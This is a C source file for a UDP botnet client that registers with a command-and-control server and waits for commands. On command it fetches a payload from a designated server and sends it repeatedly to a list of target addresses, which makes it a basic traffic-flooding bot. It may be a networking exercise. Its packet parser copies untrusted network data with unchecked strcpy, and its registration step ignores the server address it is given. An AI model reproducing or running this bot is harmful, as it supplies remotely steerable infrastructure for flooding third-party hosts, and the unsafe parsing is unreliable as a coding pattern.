#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/time.h>
#include <err.h>
#include <arpa/inet.h>

#include "msg.h"

#define BUFLEN 512

void usage()
{
    fprintf(stderr, "Usage: ./bot server_ip server_port\n");
    exit(1);
}

int udp_socket()
{
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);

    if(sockfd < 0){
        fprintf(stderr, "socket() error");
        exit(2);
    }

    return sockfd;
}

void reg(int sockfd, char *ip_address, char *port)
{   
    char *data = "REG\n";

    struct sockaddr_in server = { 0 };
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY; 
    server.sin_port = htons(atoi(port));

    sendto(sockfd, data, strlen(data), 0,  
           (const struct sockaddr *) &server,
           sizeof(server));

}

void parse_packet(struct msg *message, char *packet, int bytes_recv)
{
    int i = PORT_LEN + ADDR_LEN;

    int counter = (bytes_recv - 1)/i;

    message->command = *packet++;    

    for(i = 0; i < counter; i++){
        
        strcpy(message->entry[i].ip_address, packet);
        packet += sizeof(message->entry[i].ip_address);

        strcpy(message->entry[i].port_number, packet);
        packet += sizeof(message->entry[i].port_number);

    }

    message->number_of_pairs = counter;
}

void prog(int sockfd, struct msg *message, char *payload)
{
    char *data = "HELLO\n";

    char *udp_server_ip = message->entry[0].ip_address;
    char *udp_server_port = message->entry[0].port_number;
	
    struct addrinfo *udp_server;
    struct addrinfo hints;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    
    int status = getaddrinfo(udp_server_ip, udp_server_port, &hints, &udp_server);
    if(status != 0){
		fprintf(stderr, "GAI error %s\n", gai_strerror(status));
		exit(3);
	}
	
    sendto(sockfd, data, strlen(data), 0, udp_server->ai_addr, udp_server->ai_addrlen);
    
    recvfrom(sockfd, payload, BUFLEN, 0, NULL, NULL); 
    
    printf("%s\n", payload);

}

void run(int sockfd, struct msg *message, char *payload)
{
    struct addrinfo hints;
    struct addrinfo *res;
    
    for(int i = 0; i < 15; ++i){
        
        for(int j = 0; j < message->number_of_pairs; ++j){
            
            memset(&hints, 0, sizeof(hints));
            hints.ai_family = AF_INET;
            hints.ai_socktype = SOCK_DGRAM;

            int status = getaddrinfo(message->entry[j].ip_address, message->entry[j].port_number, &hints, &res);
            if(status != 0){
				fprintf(stderr, "GAI error %s\n", gai_strerror(status));
				exit(3);
			}

            sendto(sockfd, payload, strlen(payload), 0,
                   res->ai_addr, res->ai_addrlen);
        }
        
        sleep(1);
    } 
}

int main(int argc, char **argv)
{
    if(argc != 3) usage();

    char payload[BUFLEN];
    char packet[BUFLEN];
    struct msg message;

    char *cnc_ip = argv[1];
    char *cnc_port = argv[2];

    int sockfd = udp_socket();
    
    reg(sockfd, cnc_ip, cnc_port);
   
    while(1){

        int bytes_recv = recvfrom(sockfd, packet, BUFLEN,
                                  0, NULL, NULL);
        
        parse_packet(&message, packet, bytes_recv);
        
        if(message.command == '0') 
            prog(sockfd, &message, payload);
        
        else if(message.command == '1')
            run(sockfd, &message, payload);

    } 

    close(sockfd);

    return 0;
}
